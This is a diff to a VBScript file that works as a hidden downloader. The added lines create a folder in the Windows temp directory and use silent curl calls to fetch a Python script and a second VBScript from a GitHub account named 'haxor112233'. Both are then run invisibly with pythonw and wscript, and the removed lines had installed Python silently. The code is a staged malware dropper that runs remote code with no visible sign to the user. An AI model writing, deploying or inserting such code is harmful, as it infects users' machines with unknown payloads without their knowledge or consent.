@@ -1,18 +1,23 @@
 Set objShell = CreateObject("WScript.Shell")
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 
+tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%") & "\new"
+scriptPathPy = tempFolder & "\a.py"
+scriptPathVbs = tempFolder & "\b2.vbs"
 
+' Check if the folder exists, if not, create it
+If Not objFSO.FolderExists(tempFolder) Then
+    objFSO.CreateFolder(tempFolder)
+End If
 
+' Download a.py using curl
+objShell.Run "cmd /c curl -s -o """ & scriptPathPy & """ ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/a.py""", 0, True
 
-' Run the first curl command to download a.py
-objShell.Run "cmd /c curl -s -o ""%TEMP%\a.py"" ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/a.py""", 0, True
+' Run a.py using pythonw
+objShell.Run "pythonw """ & scriptPathPy & """", 0, False
 
-' Run the second curl command to download the Python installer
-objShell.Run "cmd /c curl -s -o ""%TEMP%\python-3.13.1-amd64.exe"" ""https://www.python.org/ftp/python/3.13.1/python-3.13.1-amd64.exe""", 0, True
+' Download b2.vbs using curl
+objShell.Run "cmd /c curl -s -o """ & scriptPathVbs & """ ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/b2.vbs""", 0, True
 
-' Run the Python installer with silent options
-objShell.Run """%TEMP%\python-3.13.1-amd64.exe"" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1", 0, True
-
-
-
-
+' Run b2.vbs using wscript
+objShell.Run "wscript """ & scriptPathVbs & """", 0, False
